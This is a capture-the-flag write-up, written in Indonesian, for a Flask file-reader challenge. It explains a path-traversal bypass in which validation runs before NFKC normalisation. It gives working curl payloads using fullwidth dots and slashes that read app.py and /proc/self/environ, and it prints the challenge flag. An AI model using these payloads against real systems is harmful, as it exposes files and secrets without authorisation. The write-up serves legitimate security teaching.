# Paper Trail Writeup

## Challenge

Challenge **Paper Trail** menyediakan sebuah web document reader. Aplikasi ini memungkinkan user membaca file dari direktori `documents` melalui endpoint berikut:

```text
GET /api/files?path=<relative-path>
```

Pada halaman utama, aplikasi hanya menampilkan beberapa file yang dianggap visible, yaitu:

```text
bulletin.txt
guides/checklist.txt
rota.txt
```

Tujuan challenge ini adalah menemukan cara untuk membaca data lain di luar daftar dokumen tersebut dan mendapatkan flag.

## Source Code Review

Bagian penting dari source code terdapat pada fungsi `resolve_document()`:

```python
def resolve_document(raw_path: str) -> Path:
    requested_path = raw_path.strip()
    if not requested_path:
        abort(400, "missing path")

    if "\x00" in requested_path:
        abort(400, "invalid path")

    if "\\" in requested_path:
        abort(400, "backslashes are not allowed")

    pure_path = PurePosixPath(requested_path)
    if pure_path.is_absolute():
        abort(400, "absolute paths are not allowed")

    if any(part in {"", ".", ".."} or part.startswith(".") for part in pure_path.parts):
        abort(400, "invalid path segments")

    safe_path = unicodedata.normalize("NFKC", str(pure_path))

    candidate = BASE_DIR / safe_path
```

Aplikasi mencoba mencegah path traversal dengan menolak karakter seperti:

```text
.
..
hidden file yang diawali .
absolute path
backslash
```

Namun terdapat kesalahan urutan validasi. Path divalidasi terlebih dahulu, lalu baru dinormalisasi menggunakan:

```python
unicodedata.normalize("NFKC", str(pure_path))
```

Hal ini menjadi celah karena beberapa karakter Unicode dapat berubah menjadi karakter ASCII setelah normalisasi NFKC.

## Analisis Kerentanan

Karakter Unicode fullwidth berikut dapat digunakan untuk bypass validasi:

```text
． = fullwidth dot
／ = fullwidth slash
```

Sebelum normalisasi, payload seperti ini:

```text
．．／app.py
```

tidak dianggap sebagai `../app.py`, sehingga lolos dari pengecekan:

```python
part in {"", ".", ".."}
```

Namun setelah proses normalisasi NFKC, payload tersebut berubah menjadi:

```text
../app.py
```

Akibatnya, aplikasi dapat dipaksa membaca file di luar direktori `documents`.

Untuk membuktikan path traversal, digunakan command berikut:

```bash
curl -skG "$BASE/api/files" \
  --data-urlencode 'path=．．／app.py'
```

Hasilnya, aplikasi berhasil membaca file `app.py` di luar folder `documents`:

```json
{
  "path": "../app.py",
  "content": "import html\nimport os\nimport unicodedata\n..."
}
```

Ini membuktikan bahwa bypass path traversal berhasil.

## Eksploitasi

Setelah traversal berhasil, langkah berikutnya adalah mencari lokasi flag. Karena aplikasi Flask berjalan di environment container, flag kemungkinan disimpan sebagai environment variable.

File environment process dapat dibaca melalui:

```text
/proc/self/environ
```

Karena base directory berada di `/app/documents`, traversal ke `/proc/self/environ` dapat dilakukan dengan payload:

```text
．．／．．／proc／self／environ
```

Command yang digunakan:

```bash
curl -skG "$BASE/api/files" \
  --data-urlencode 'path=．．／．．／proc／self／environ'
```

Output yang didapatkan berisi environment variable proses aplikasi:

```text
PATH=/opt/venv/bin:/usr/local/bin:...
HOSTNAME=web
PORT=8080
FLAG=uctf{8b16886a8e565396056de27e514ccafc03b2}
HOME=/app
```

Dari output tersebut, flag ditemukan pada environment variable `FLAG`.

## Command Final

```bash
BASE='https://http-01kyy2wn0dhxkt8dpp6ct01hpm.u-ctf-ctf-7001b39a.urc.tf'

curl -skG "$BASE/api/files" \
  --data-urlencode 'path=．．／．．／proc／self／environ' \
| python3 -c 'import sys,json; print(json.load(sys.stdin)["content"].replace("\x00","\n"))'
```

## Flag

```text
uctf{8b16886a8e565396056de27e514ccafc03b2}
```

